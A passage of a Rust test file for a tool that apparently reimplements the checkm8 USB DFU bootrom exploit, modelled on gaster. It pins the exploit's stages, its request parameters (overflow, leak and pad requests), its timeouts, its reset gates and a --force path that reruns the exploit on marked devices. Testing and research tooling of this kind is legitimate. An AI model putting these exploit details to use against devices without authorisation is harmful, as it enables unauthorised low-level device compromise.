            w_value: 0,
            w_index: 0,
            w_length: 0x500,
            status,
            transferred: 0,
            requested: 0x500,
            micros: 120,
            libusb_rc: -1,
            abort_after_ms: None,
        };
        // Fewer than overwrite_pad bytes AND a STALL on the pad: pass.
        assert!(setup_passed(0, 0x500, Some(&pad(XferStatus::Stall))));
        assert!(setup_passed(0x4FF, 0x500, Some(&pad(XferStatus::Stall))));
        // A pad that does not STALL is not the pass condition — not OK, not a
        // timeout, not anything else.
        for s in [
            XferStatus::Ok,
            XferStatus::Timeout,
            XferStatus::Cancelled,
            XferStatus::Error,
            XferStatus::NoDevice,
        ] {
            assert!(
                !setup_passed(0, 0x500, Some(&pad(s))),
                "{s} is not a STALL"
            );
        }
        // No pad was sent because the aborted transfer delivered >= overwrite_pad:
        // gaster's `&&` short-circuits there, so the attempt cannot pass.
        assert!(!setup_passed(0x500, 0x500, None));
        assert!(!setup_passed(0x800, 0x500, None));
    }

    /// One pad STALL, counted once. `record_pad` counts it; the pass branch in
    /// `stage_setup` used to add a second one, so a single successful pad request
    /// printed `pad_stall=2` in the summary the operator reads. The gate no
    /// longer touches the counter, and this pins the contract it relies on.
    #[test]
    fn one_pad_stall_is_counted_once() {
        let pad = XferResult {
            seq: 9,
            bm_request_type: 0,
            b_request: 0,
            w_value: 0,
            w_index: 0,
            w_length: 0x500,
            status: XferStatus::Stall,
            transferred: 0,
            requested: 0x500,
            micros: 120,
            libusb_rc: -1,
            abort_after_ms: None,
        };
        let mut s = SetupStats::new(0x500, 5, 0, 5);
        s.attempts = 1;
        s.record_pad(&pad);
        assert!(setup_passed(0, 0x500, Some(&pad)));
        assert_eq!(s.pad_stalls, 1);
        assert!(s.summary().contains("pad_stall=1"), "{}", s.summary());
    }

    #[test]
    fn stdout_sampling_is_bounded_but_never_silent_at_the_head() {
        let opts = RunOptions::default();
        assert!(should_print_attempt(&opts, 1));
        assert!(should_print_attempt(&opts, SETUP_STDOUT_HEAD));
        assert!(!should_print_attempt(&opts, SETUP_STDOUT_HEAD + 1));
        assert!(should_print_attempt(&opts, SETUP_STDOUT_EVERY));
        assert!(should_print_attempt(&opts, 20_000));
        let verbose = RunOptions {
            verbose: true,
            ..RunOptions::default()
        };
        assert!(should_print_attempt(&verbose, 3));
        assert!(should_print_attempt(&verbose, 19_999));
    }

    #[test]
    fn setup_stats_count_every_outcome() {
        let mk = |status: XferStatus, transferred: usize, micros: u64| XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: DFU_MAX_TRANSFER_SZ,
            status,
            transferred,
            requested: DFU_MAX_TRANSFER_SZ as usize,
            micros,
            libusb_rc: -2,
            abort_after_ms: Some(4),
        };
        let mut s = SetupStats::new(0x500, 5, 0, 5);
        s.attempts = 2;
        s.note_window(4);
        s.note_window(4);
        s.note_window(5);
        let abort = mk(XferStatus::Cancelled, 0, 4001);
        let pad = mk(XferStatus::Timeout, 0, 5002);
        s.record_pad(&pad);
        let line = s.attempt_line(&abort, 4, Some(0x500), Some(&pad));
        assert!(line.contains("abort_window_ms=4"), "{line}");
        assert!(line.contains("0 (host reported nothing)"), "{line}");
        assert!(line.contains("abort_micros=4001"), "{line}");
        assert!(line.contains("pad_req=1280"), "{line}");
        assert!(line.contains("pad_status=TIMEOUT"), "{line}");
        // Requested vs effective, adjacent, so the deadline's being honoured is
        // checkable from one line — and the sweep's own timeout is named next to
        // it so the two numbers cannot be conflated.
        assert!(line.contains("pad_deadline_ms=5"), "{line}");
        assert!(line.contains("pad_micros=5002"), "{line}");
        assert!(line.contains("usb_timeout=5ms"), "{line}");
        assert_eq!(s.windows, vec![4, 5]);
        assert_eq!(s.zero_aborts, 1);
        assert_eq!(s.short_aborts, 1);
        assert_eq!(s.pad_timeouts, 1);
        assert_eq!(s.last_micros, 4001);
        let summary = s.summary();
        assert!(summary.contains("pad_timeout=1"), "{summary}");
        assert!(summary.contains("distinct_abort_windows=2"), "{summary}");
        assert!(summary.contains("pad_deadline_ms=5ms"), "{summary}");
    }

    #[test]
    fn stalling_the_pad_is_recorded_as_stall_only() {
        let pad = XferResult {
            seq: 9,
            bm_request_type: 0,
            b_request: 0,
            w_value: 0,
            w_index: 0,
            w_length: 0x500,
            status: XferStatus::Stall,
            transferred: 0,
            requested: 0x500,
            micros: 120,
            libusb_rc: -1,
            abort_after_ms: None,
        };
        let mut s = SetupStats::new(0x500, 5, 0, 5);
        s.record_pad(&pad);
        assert_eq!((s.pad_stalls, s.pad_ok, s.pad_timeouts, s.pad_other), (1, 0, 0, 0));
    }

    // -- defaults and the frozen values ------------------------------------

    #[test]
    fn defaults_are_gasters_defaults() {
        let o = RunOptions::default();
        assert_eq!(o.max_rounds, 64);
        assert_eq!(o.usb_timeout_ms, 5, "gaster.c:1631-1633");
        assert_eq!(o.abort_timeout_min_ms, 0, "gaster.c:1635-1637");
        assert_eq!(o.leak_windex, LEAK_WINDEX_GASTER);
        assert!(!o.dry_run && !o.verbose && !o.allow_winusb && !o.stop_after_setup_stall);
        assert!(!o.force, "--force must be opt-in: a marked device skips the write path by default");
        assert_eq!(o.trace_path, None);
        assert_eq!(o.stage_filter, None);
        assert_eq!(o.settle_ms, 0, "0 = gaster's behaviour");
        assert_eq!(o.setup_budget.max_attempts, 20_000);
        assert_eq!(o.setup_budget.max_millis, 600_000);
    }

    /// **The `--force` falsifier.** The marker short-circuit is the defect rule 14
    /// names: on a device whose descriptor already says `PWND:[checkm8]`, a plain
    /// `run` returns `Pwned` having sent nothing (`transfers=0`), and the verdict
    /// now refuses `[PWNED]` for exactly that case. `--force` must flip the
    /// decision, and the FIRST assertion is the control that stops this test from
    /// being a tautology: without `--force` the skip must remain.
    #[test]
    fn force_runs_the_write_path_on_a_marked_device() {
        let marked = DeviceIdentity::parse(
            "CPID:8003 CPRV:01 BDID:02 SRTG:[IBOOT-2234.0.0.2.22] PWND:[checkm8]",
        );
        let clean =
            DeviceIdentity::parse("CPID:8003 CPRV:01 BDID:02 SRTG:[IBOOT-2234.0.0.2.22]");
        assert!(marked.is_pwned() && !clean.is_pwned(), "fixtures must differ on the marker");

        assert!(
            skip_on_marker(&RunOptions::default(), &marked),
            "without --force a marked device must still skip the write path (the reference \
             behaviour, and the source of the 2026-10-03 transfers=0 run)"
        );
        let forced = RunOptions {
            force: true,
            ..RunOptions::default()
        };
        assert!(
            !skip_on_marker(&forced, &marked),
            "--force must run the exploit even though the marker is present"
        );
        // A clean device is unaffected in both directions: `--force` is not a
        // different exploit, only a bypass of the marker short-circuit.
        assert!(!skip_on_marker(&forced, &clean));
        assert!(!skip_on_marker(&RunOptions::default(), &clean));
    }

    /// The probe's state table, pinned by name for every number it can return.
    /// The whole result of `--probe-setup-state` is "still 5" versus "3/4" versus
    /// "10", and this session has already been burned once by a state table that
    /// rendered distinct states identically — so `3`, `4` and `10` must not be
    /// `other`.
    #[test]
    fn the_setup_probe_state_table_is_pinned() {
        assert_eq!(dfu_state_label(0), "appIDLE");
        assert_eq!(dfu_state_label(1), "appDETACH");
        assert_eq!(dfu_state_label(2), "dfuIDLE");
        assert_eq!(dfu_state_label(3), "dfuDNLOAD-SYNC");
        assert_eq!(dfu_state_label(4), "dfuDNBUSY");
        assert_eq!(dfu_state_label(5), "dfuDNLOAD-IDLE");
        assert_eq!(dfu_state_label(6), "manifestSync");
        assert_eq!(dfu_state_label(7), "manifest");
        assert_eq!(dfu_state_label(8), "manifestWaitReset");
        assert_eq!(dfu_state_label(9), "dfuUPLOAD-IDLE");
        assert_eq!(dfu_state_label(10), "dfuERROR");
        assert_eq!(dfu_state_label(11), "other");
        assert_eq!(dfu_state_label(0xFF), "other");

        // Off by default: the shipped sequence stays byte-identical to gaster's.
        assert!(!RunOptions::default().probe_setup_state);

        // The tally keeps unread separate from any real state, and reads the
        // distribution out of the last probe line of a sweep.
        let mut s = SetupStats::new(0x500, 5, 0, 5);
        assert_eq!(s.probe_tally_line(), "-");
        s.record_probe(Some(5));
        s.record_probe(Some(5));
        s.record_probe(Some(4));
        s.record_probe(None);
        let tally = s.probe_tally_line();
        assert!(tally.contains("4 (dfuDNBUSY)=1"), "{tally}");
        assert!(tally.contains("5 (dfuDNLOAD-IDLE)=2"), "{tally}");
        assert!(tally.contains("unread=1"), "{tally}");
        assert!(!tally.contains("other"), "{tally}");
    }

    /// The pad's timeout is a parameter of its own and must stay independent of
    /// the abort window, in both directions. The **default is gaster's 5 ms** so
    /// that SETUP cannot manufacture a false pass (the device's EP0 watchdog
    /// STALLs a stuck request at 21-37 ms — see `RunOptions::pad_timeout_ms`),
    /// while `--pad-timeout-ms` can still move it deliberately. If a refactor ever
    /// re-couples the two, this fails: raising `usb_timeout_ms` to give the pad
    /// time would let the 2048-byte DNLOAD complete and destroy the sweep.
    #[test]
    fn the_pad_timeout_is_independent_of_the_abort_window() {
        let o = RunOptions::default();
        assert_eq!(pad_timeout(&o), 5, "gaster's value, so a false pass is not the default");
        assert_eq!(o.timeout_ms(), 5, "the abort window base is still gaster's");
        assert_eq!(
            (o.usb_timeout_ms, o.pad_timeout_ms),
            (DEFAULT_USB_TIMEOUT_MS, DEFAULT_PAD_TIMEOUT_MS)
        );

        // The two defaults are equal by design; independence is proven by moving
        // each value and checking the other does not follow.
        let wide_pad = RunOptions {
            pad_timeout_ms: 123,
            ..RunOptions::default()
        };
        assert_eq!(pad_timeout(&wide_pad), 123);
        assert_eq!(wide_pad.timeout_ms(), 5);
        assert_eq!(
            sweep_windows(wide_pad.timeout_ms(), wide_pad.abort_timeout_min_ms, 3),
            vec![4, 5, 0],
            "a big pad timeout must not touch the sweep"
        );

        let wide_abort = RunOptions {
            usb_timeout_ms: 20,
            ..RunOptions::default()
        };
        assert_eq!(wide_abort.timeout_ms(), 20);
        assert_eq!(pad_timeout(&wide_abort), 5, "the pad keeps its own value");
        assert_eq!(
            sweep_windows(wide_abort.timeout_ms(), wide_abort.abort_timeout_min_ms, 3),
            vec![19, 20, 0],
            "and the pad timeout must not touch the sweep either"
        );

        // 0 is not a legal transfer timeout; it is treated as 1, like the window.
        let zero = RunOptions {
            pad_timeout_ms: 0,
            ..RunOptions::default()
        };
        assert_eq!(pad_timeout(&zero), 1);
    }

    #[test]
    fn leak_windexes_are_the_frozen_ones() {
        assert_eq!(LEAK_WINDEX_GASTER, 0x0A, "gaster.c:52 USB_MAX_STRING_DESCRIPTOR_IDX");
        assert_eq!(LEAK_WINDEX_IPWNDFU, 0x00);
    }

    #[test]
    fn stage_filter_is_honoured_offline() {
        let outcome = run(RunOptions {
            dry_run: true,
            ..RunOptions::default()
        });
        assert!(matches!(outcome, RunOutcome::Aborted(_)), "{outcome:?}");
    }

    #[test]
    fn single_stage_dry_run_touches_nothing() {
        for stage in [Stage::Reset, Stage::Setup, Stage::Spray, Stage::Patch] {
            let outcome = run_one_stage(
                stage,
                RunOptions {
                    dry_run: true,
                    ..RunOptions::default()
                },
            );
            match outcome {
                RunOutcome::Aborted(msg) => assert!(msg.contains("nothing was sent"), "{msg}"),
                other => panic!("{stage:?} dry run returned {other:?}"),
            }
        }
    }

    /// PWNED is a state, not something to run.
    #[test]
    fn pwned_is_not_runnable() {
        let outcome = run_one_stage(
            Stage::Pwned,
            RunOptions {
                dry_run: true,
                ..RunOptions::default()
            },
        );
        match outcome {
            RunOutcome::Aborted(m) => assert!(m.contains("not a stage"), "{m}"),
            other => panic!("{other:?}"),
        }
    }

    /// SPRAY refuses a config it has no sequence for rather than approximating,
    /// and the A9 table must keep `large_leak == 0` (the A9 branch selector).
    #[test]
    fn spray_guards_are_specific() {
        let e = crate::config::all_configs()
            .iter()
            .find(|c| c.large_leak != 0);
        assert!(e.is_none(), "A9 configs must have large_leak == 0");
        let h = crate::config::all_configs().iter().find(|c| c.hole != 0);
        assert!(h.is_none(), "A9 configs must have hole == 0 (gaster.c:905)");
    }

    /// **The firing control for instrument fix 4** (review/07 finding 13): the RESET stage's
    /// claim is DERIVED from its `bus_reset_delivered` predicate — only a DELIVERED reset may
    /// claim `stage_pass`; everything else is `stage_unproven`, never a PASS sitting next to its
    /// own FAILed predicate (the corpus census: 139 `stage_pass` RESET vs 350 FAIL / 0 PASS).
    /// Reverting the derivation flips these assertions red.
    #[test]
    fn control_reset_stage_claim_is_derived_from_bus_reset_delivered() {
        let (kind, detail) = reset_stage_event(true, "issued, delivered");
        assert_eq!(kind, "stage_pass");
        assert!(detail.contains("DELIVERED"), "{detail}");

        for evidence in ["issued, effect unverified", "refuted by the device", "driver cannot reset"] {
            let (kind, detail) = reset_stage_event(false, evidence);
            assert_eq!(kind, crate::trace::kind::STAGE_UNPROVEN, "{evidence}");
            assert!(detail.contains("UNPROVEN"), "{detail}");
            assert!(detail.contains("bus_reset_delivered=FAIL"), "{detail}");
            assert!(detail.contains(evidence), "{detail}");
        }
    }

    // -- the post-attempt reset gate ---------------------------------------
    //
    // B1 was: `Unverified` — which this crate documents as "not success; not
    // failure" (`types.rs:387-391`) — was gated on as if it were failure, in two
    // places, so the run aborted at round 2 and SPRAY/PATCH were unreachable.
    // These tests pin the replacement policy. The gate is pure and the call
    // sites call it, so the wiring cannot silently diverge from the tests.

    /// A reset fixture with the shape each evidence variant actually produces.
    /// `libusb_rc = 0` is `LIBUSB_SUCCESS`; `bus_reset_delivered` is what
    /// `usb.rs:1081` derives from the evidence.
    fn reset_report(evidence: ResetEvidence) -> ResetReport {
        let (before, after, capability, claimed, note) = match evidence {
            ResetEvidence::Delivered => (
                Some(8u8),
                Some(0u8),
                ResetCapability::Real,
                true,
                "parked in manifestWaitReset, read back idle",
            ),
            ResetEvidence::Refuted => (
                Some(8u8),
                Some(8u8),
                ResetCapability::Real,
                true,
                "still parked in manifestWaitReset",
            ),
            // What the live device produced after RESET: gaster's own trailing
            // 64-byte flush (`gaster.c:840`) unparks the machine to state 5
            // before the reset is taken.
            ResetEvidence::Unverified => (
                Some(5u8),
                Some(5u8),
                ResetCapability::Real,
                true,
                "unchanged, effect unverified",
            ),
            ResetEvidence::DriverCannotReset => (
                None,
                None,
                ResetCapability::PipeCycleOnly,
                false,
                "driver cannot reset",
            ),
        };
        ResetReport {
            libusb_rc: 0,
            interface_claimed: claimed,
            dfu_state_before: before,
            dfu_state_after: after,
            capability,
            evidence,
            bus_reset_delivered: evidence == ResetEvidence::Delivered,
            micros: 1234,
            note: note.to_string(),
        }
    }

    /// REQUIRED TEST 1: an `Unverified` post-stage reset does **not** abort — and
    /// it is not silent either.
    #[test]
    fn unverified_post_stage_reset_does_not_abort() {
        assert_eq!(
            reset_gate(ResetEvidence::Unverified, false),
            ResetGate::ContinueLoudly
        );
        let w = reset_warning(
            "post-stage",
            "SETUP",
            &reset_report(ResetEvidence::Unverified),
        );
        assert!(w.contains("did not prove itself"), "{w}");
        assert!(w.contains("issued, effect unverified"), "{w}");
        assert!(w.contains("DFU state 5 (dfuDNLOAD-IDLE) -> 5 (dfuDNLOAD-IDLE)"), "{w}");
        assert!(w.contains("gaster.c:197-200"), "the reference continues: {w}");
        assert!(w.contains("reset_unverified"), "{w}");
    }

    /// REQUIRED TEST 2: `Refuted` — the device positively contradicts us — aborts.
    #[test]
    fn refuted_post_stage_reset_aborts() {
        assert_eq!(reset_gate(ResetEvidence::Refuted, false), ResetGate::Stop);
        let m = reset_stop_message(
            "post-stage",
            "PATCH",
            &reset_report(ResetEvidence::Refuted),
            false,
        );
        assert!(m.contains("STOP") || m.contains("Stop"), "{m}");
        assert!(m.contains("REFUTED by the device"), "{m}");
        assert!(m.contains("manifestWaitReset"), "{m}");
        assert!(m.contains("--allow-winusb overrides"), "{m}");
    }

    /// REQUIRED TEST 3: a driver that cannot deliver a bus reset aborts.
    #[test]
    fn driver_cannot_reset_aborts() {
        assert_eq!(
            reset_gate(ResetEvidence::DriverCannotReset, false),
            ResetGate::Stop
        );
        let m = reset_stop_message(
            "post-stage",
            "SETUP",
            &reset_report(ResetEvidence::DriverCannotReset),
            false,
        );
        assert!(m.contains("cannot deliver a host-initiated bus reset"), "{m}");
    }

    /// `Delivered` continues, and `--allow-winusb` keeps its documented role —
    /// reproduce a failure deliberately — without being the only route past
    /// `Unverified`.
    #[test]
    fn a_delivered_reset_continues_and_the_flag_only_downgrades_a_stop() {
        assert_eq!(
            reset_gate(ResetEvidence::Delivered, false),
            ResetGate::Continue
        );
        assert_eq!(
            reset_gate(ResetEvidence::Delivered, true),
            ResetGate::Continue
        );
        assert_eq!(
            reset_gate(ResetEvidence::Refuted, true),
            ResetGate::ContinueLoudly
        );
        assert_eq!(
            reset_gate(ResetEvidence::DriverCannotReset, true),
            ResetGate::ContinueLoudly
        );
    }

    /// The recording must land in the counters `verdict.rs` reads: an
    /// `Unverified` reset is not a pipe cycle and not a refutation. Passing a
    /// `bool` here is what used to make the verdict blame the driver.
    #[test]
    fn the_reset_counters_follow_the_evidence() {
        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
        record_reset(
            &mut t,
            "post-stage",
            "SETUP",
            &reset_report(ResetEvidence::Unverified),
        );
        let c = t.counters();
        assert_eq!(c.resets_attempted, 1);
        assert_eq!(c.resets_real, 0);
        assert_eq!(c.resets_unverified, 1);
        assert_eq!(c.resets_pipe_cycle, 0, "unverified is not a pipe cycle");
        assert_eq!(c.resets_refuted, 0);

        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
        record_reset(
            &mut t,
            "post-stage",
            "PATCH",
            &reset_report(ResetEvidence::Delivered),
        );
        let c = t.counters();
        assert_eq!((c.resets_attempted, c.resets_real), (1, 1));

        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
        record_reset(
            &mut t,
            "post-stage",
            "PATCH",
            &reset_report(ResetEvidence::Refuted),
        );
        let c = t.counters();
        assert_eq!(
            (c.resets_attempted, c.resets_refuted, c.resets_pipe_cycle),
            (1, 1, 0)
        );
    }

    /// A state that was never read is rendered as unread, never guessed — and a
    /// machine that moved somewhere unexpected is shown as what it measured.
    #[test]
    fn an_unread_state_is_rendered_as_unread() {
        let unread = ResetReport {
            dfu_state_before: None,
            dfu_state_after: None,
            ..reset_report(ResetEvidence::Unverified)
        };
        assert_eq!(dfu_state_pair(&unread), "DFU state unread -> unread");
        assert!(
            reset_facts("post-stage", "SETUP", &unread).contains("dfu_state")
                || reset_facts("post-stage", "SETUP", &unread).contains("DFU state unread"),
            "{}",
            reset_facts("post-stage", "SETUP", &unread)
        );
        let moved = ResetReport {
            dfu_state_before: Some(8),
            dfu_state_after: Some(6),
            ..reset_report(ResetEvidence::Unverified)
        };
        assert_eq!(
            dfu_state_pair(&moved),
            "DFU state 8 (manifestWaitReset) -> 6 (manifestSync)"
        );
    }

    // -- the diagnostic stop (HANDOFF §6.3) --------------------------------

    /// The flag used to be honoured only by the round loop, so
    /// `run --stage setup --stop-after-setup-stall` reported a reset refusal
    /// instead of the SETUP proof. One predicate, both paths.
    #[test]
    fn the_diagnostic_stop_fires_only_for_a_passed_setup() {
        let on = RunOptions {
            stop_after_setup_stall: true,
            ..RunOptions::default()
        };
        assert!(setup_stall_stop_requested(Stage::Setup, true, &on));
        assert!(
            !setup_stall_stop_requested(Stage::Setup, false, &on),
            "a failed SETUP is not the proof"
        );
        assert!(!setup_stall_stop_requested(Stage::Spray, true, &on));
        assert!(!setup_stall_stop_requested(Stage::Reset, true, &on));
        assert!(!setup_stall_stop_requested(
            Stage::Setup,
            true,
            &RunOptions::default()
        ));
    }

    #[test]
    fn the_diagnostic_stop_message_names_the_proof_and_what_was_skipped() {
        let m = match setup_stall_stop_outcome(37, 1) {
            RunOutcome::Aborted(m) => m,
            other => panic!("{other:?}"),
        };
        assert!(m.contains("--stop-after-setup-stall"), "{m}");
        assert!(m.contains("gaster.c:853"), "{m}");
        assert!(m.contains("37 attempt(s)"), "{m}");
        assert!(m.contains("1 pad STALL(s)"), "{m}");
        assert!(
            m.contains("gaster.c:1268"),
            "the mandatory post-attempt reset still happened: {m}"
        );
        assert!(m.contains("SPRAY and PATCH were not attempted"), "{m}");
        assert!(m.contains("not pwned"), "{m}");
    }

    // -- SPRAY's wire parameters and predicate (B2, B3, B4) ----------------

    /// B2: gaster builds `wValue` from the cached
    /// `device_descriptor.i_serial_number` (`gaster.c:866`) and never re-reads
    /// it. The mapping is pure now, so no live `GET_DESCRIPTOR` can creep back
    /// into the loop (`usb.rs:472` forbids it there).
    #[test]
    fn leak_wvalue_is_gasters_value_mapping() {
        assert_eq!(leak_wvalue(0), 0x0300);
        assert_eq!(leak_wvalue(4), 0x0304, "the declared index (gaster.c:866)");
        assert_eq!(leak_wvalue(0x0A), 0x030A);
        assert_eq!(leak_wvalue(0xFF), 0x03FF);
    }

    /// B3: a transfer the transport refused was never submitted, so it cannot
    /// stand in for gaster's `completed != 0` clause (`gaster.c:282`). Without
    /// this, a device that died between the stall and the leak scored both the
    /// leak and the no-leak as successes and SPRAY returned `Pass` on a dead
    /// handle.
    #[test]
    fn a_refused_leak_is_not_a_successful_leak() {
        let base = XferResult {
            seq: 1,
            bm_request_type: 0x80,
            b_request: 6,
            w_value: 0x0304,
            w_index: LEAK_WINDEX_GASTER,
            w_length: EP0_MAX_PACKET_SZ,
            status: XferStatus::Ok,
            transferred: 0,
            requested: EP0_MAX_PACKET_SZ as usize,
            micros: 900,
            libusb_rc: 0,
            abort_after_ms: Some(1),
        };
        assert!(
            leak_satisfied(&base),
            "zero bytes after a real transfer is the reference's success"
        );
        assert!(abort_completed(&base) && !abort_was_refused(&base));

        // Reaped, but with bytes: gaster requires zero (`gaster.c:866`).
        assert!(!leak_satisfied(&XferResult {
            transferred: 0x40,
            ..base.clone()
        }));

        // The refused shape: never submitted, so no abort window and no time.
        let refused = XferResult {
            status: XferStatus::Error,
            micros: 0,
            abort_after_ms: None,
            ..base.clone()
        };
        assert!(
            abort_completed(&refused),
            "the old predicate called this completed"
        );
        assert!(
            !leak_satisfied(&refused),
            "and this is why SPRAY could pass on a dead handle"
        );

        // A device that is gone is not a measurement either.
        assert!(!leak_satisfied(&XferResult {
            status: XferStatus::NoDevice,
            ..base.clone()
        }));

        // A reaped ERROR that moved zero bytes still satisfies it: gaster's
        // wrapper counts every terminal status as completed (`gaster.c:220-223`).
        let reaped_error = XferResult {
            status: XferStatus::Error,
            micros: 4012,
            abort_after_ms: Some(1),
            ..base
        };
        assert!(leak_satisfied(&reaped_error));
    }

    /// A chunk counts as complete only when the device acknowledged every byte.
    /// This is the *recording* decision, not the stage's decision: gaster's chunk
    /// loop cannot fail (`gaster.c:226-240`, `:1213-1216`), so `stage_patch`
    /// records a short chunk and continues. The continue-instead-of-abort control
    /// flow needs a `Transport` and is inspection-pinned — see the honest-limit
    /// note on `stage_patch`.
    #[test]
    fn a_short_upload_chunk_is_recognised_but_never_stops_the_stage() {
        let mk = |status: XferStatus, transferred: usize| XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: 528,
            status,
            transferred,
            requested: 528,
            micros: 12_000,
            libusb_rc: -7,
            abort_after_ms: None,
        };
        assert!(patch_chunk_complete(&mk(XferStatus::Ok, 528), 528));
        assert!(!patch_chunk_complete(&mk(XferStatus::Ok, 0), 528));
        assert!(
            !patch_chunk_complete(&mk(XferStatus::Timeout, 0), 528),
            "the live run's third attempt: chunk 0 TIMEOUT 0/528"
        );
        assert!(!patch_chunk_complete(&mk(XferStatus::Stall, 0), 528));
    }

    /// The `patch_uploaded` line must make a short chunk visible rather than
    /// rounding it into a clean `uploaded=N` reading.
    #[test]
    fn the_patch_upload_summary_makes_a_short_chunk_visible() {
        let clean = patch_upload_summary(528, 528, 0, "c4fb5fd4", true);
        assert!(clean.contains("attempted=528"), "{clean}");
        assert!(clean.contains("acknowledged=528"), "{clean}");
        assert!(clean.contains("short_or_failed_chunks=0"), "{clean}");
        assert!(clean.contains("manifest_walk_completed=true"), "{clean}");
        assert!(!clean.contains("PATCH_UPLOAD_SHORT"), "{clean}");

        let short = patch_upload_summary(528, 0, 1, "c4fb5fd4", false);
        assert!(short.contains("acknowledged=0"), "{short}");
        assert!(short.contains("short_or_failed_chunks=1"), "{short}");
        assert!(short.contains("manifest_walk_completed=false"), "{short}");
        assert!(short.contains("PATCH_UPLOAD_SHORT"), "{short}");
        assert!(short.contains("continued"), "{short}");
    }

    /// B4: the wire parameters that were previously "pinned by inspection only" —
    /// PATCH's `wIndex = 0x80` (HANDOFF §8.5's bug class), SPRAY's `wIndex`,
    /// `wValue` shape and the `0x40`/`0xC1` lengths, and the CLR_STATUS length.
    #[test]
    fn the_wire_parameters_are_pinned_by_construction() {
        let s = spray_stall_req();
        assert_eq!((s.bm, s.b, s.value, s.index, s.length), (2, 3, 0, 0x80, 0));

        let o = patch_overflow_req(OVERWRITE_STRUCT_SIZE as u16);
        assert_eq!((o.bm, o.b, o.value, o.index, o.length), (2, 3, 0, 0x80, 48));
        assert_eq!(
            o.index, 0x80,
            "gaster.c:1211 — a hardcoded 0 here was a real bug (HANDOFF §8.5)"
        );

        let l = spray_leak_req(0x0304, LEAK_WINDEX_GASTER);
        assert_eq!(
            (l.bm, l.b, l.value, l.index, l.length),
            (0x80, 6, 0x0304, LEAK_WINDEX_GASTER, EP0_MAX_PACKET_SZ)
        );
        let n = spray_no_leak_req(0x0304, LEAK_WINDEX_GASTER);
        assert_eq!(n.length, 3 * EP0_MAX_PACKET_SZ + 1);
        assert_eq!(n.length, 0xC1, "gaster.c:886 is 0xC1, not ipwndfu's 0x41");
        assert_eq!((n.bm, n.b, n.value, n.index), (l.bm, l.b, l.value, l.index));

        let c = spray_clr_status_req();
        assert_eq!(
            (c.bm, c.b, c.value, c.index, c.length),
            (0x21, DFU_CLRSTATUS, 0, 0, 0xC1)
        );
    }

    // -- the single-writer entry points ------------------------------------

    /// The additive API the Lead asked for: `run_with_tracer` drives the same
    /// paths as `run`, against a caller-owned tracer — and a dry run still opens
    /// nothing, sends nothing and writes no trace line.
    #[test]
    fn run_with_tracer_drives_the_same_paths_as_run() {
        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
        let outcome = run_with_tracer(
            RunOptions {
                dry_run: true,
                ..RunOptions::default()
            },
            &mut t,
        );
        match outcome {
            RunOutcome::Aborted(m) => assert!(m.contains("dry_run: built"), "{m}"),
            other => panic!("{other:?}"),
        }
        assert_eq!(t.counters().total(), 0, "a dry run writes no trace line");

        // …and the stage-filter branch of the same entry point.
        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
        let outcome = run_with_tracer(
            RunOptions {
                dry_run: true,
                stage_filter: Some(Stage::Setup),
                ..RunOptions::default()
            },
            &mut t,
        );
        match outcome {
            RunOutcome::Aborted(m) => assert!(m.contains("nothing was sent"), "{m}"),
            other => panic!("{other:?}"),
        }
        assert_eq!(t.counters().total(), 0);
    }

    // ---- the known drop: a reset refused because the device is ABSENT ------
    //
    // MEASURED 2026-10-03: our own run stopped at the post-SPRAY reset because
    // the spray's DFU_CLRSTATUS (gaster.c:910) drops this bootrom and libusb
    // then reports LIBUSB_ERROR_NOT_FOUND. That is the exploit's own drop, not a
    // host capability problem. The two failure kinds must therefore stay apart —
    // and both directions are pinned here, because the dangerous repair is to
    // let every failed reset continue (a gate that never fires).

    /// The failure disposition, pinned over the WHOLE libusb error domain — not
    /// just the two codes seen so far (§9.3: a table tested on a sample ratifies
    /// the cells nobody looked at).
    #[test]
    fn reset_failure_disposition_pins_the_whole_domain() {
        // The binding's own constants are the ones classified.
        assert_eq!(crate::types::LIBUSB_ERROR_OTHER, -99);
        assert!(reset_error_is_device_absent(-4), "LIBUSB_ERROR_NO_DEVICE");
        assert!(reset_error_is_device_absent(-5), "LIBUSB_ERROR_NOT_FOUND");

        // The two "the device is not there" codes: continue and wait.
        for rc in [-5, -4] {
            assert!(
                reset_error_is_device_absent(rc),
                "{rc} must classify as absent"
            );
            assert_eq!(
                reset_failure_disposition(rc, false),
                ResetDisposition::KnownDrop,
                "{rc}: absent, so the run continues by itself"
            );
            assert_eq!(
                reset_failure_disposition(rc, true),
                ResetDisposition::KnownDrop,
                "{rc}: the override changes nothing about a known drop"
            );
        }

        // Everything else — IO, INVALID_PARAM, ACCESS, BUSY, TIMEOUT, OVERFLOW,
        // PIPE, INTERRUPTED, NO_MEM, NOT_SUPPORTED, OTHER, success, and values
        // outside the domain — is a refusal with the device present: STOP.
        for rc in [-1, -2, -3, -6, -7, -8, -9, -10, -11, -12, -99, 0, 1, 42, i32::MAX, i32::MIN] {
            assert!(
                !reset_error_is_device_absent(rc),
                "{rc} must not classify as absent"
            );
            assert_eq!(
                reset_failure_disposition(rc, false),
                ResetDisposition::Stop,
                "{rc}: a refusal with the device present must still stop the run"
            );
            assert_eq!(
                reset_failure_disposition(rc, true),
                ResetDisposition::StopOverridden,
                "{rc}: --allow-winusb continues loudly, it does not erase the failure"
            );
        }

        // The negative control for the obvious wrong fix, stated as a property:
        // no code outside the absent pair may ever continue by itself.
        for rc in -200..=200 {
            if reset_failure_disposition(rc, false) == ResetDisposition::KnownDrop {
                assert!(
                    reset_error_is_device_absent(rc),
                    "{rc} continued as a known drop without being an absence code"
                );
            }
        }
    }

    /// The four classes a reset can land in, pinned together so no entry can
    /// drift: delivered, issued-but-unverified, refused with the device present,
    /// and refused because the device was absent. `--allow-winusb` downgrades
    /// exactly the two `Stop` classes and changes nothing else.
    #[test]
    fn the_four_reset_classes_are_pinned_together() {
        assert_eq!(reset_gate(ResetEvidence::Delivered, false), ResetGate::Continue);
        assert_eq!(
            reset_gate(ResetEvidence::Unverified, false),
            ResetGate::ContinueLoudly
        );
        assert_eq!(reset_gate(ResetEvidence::Refuted, false), ResetGate::Stop);
        assert_eq!(
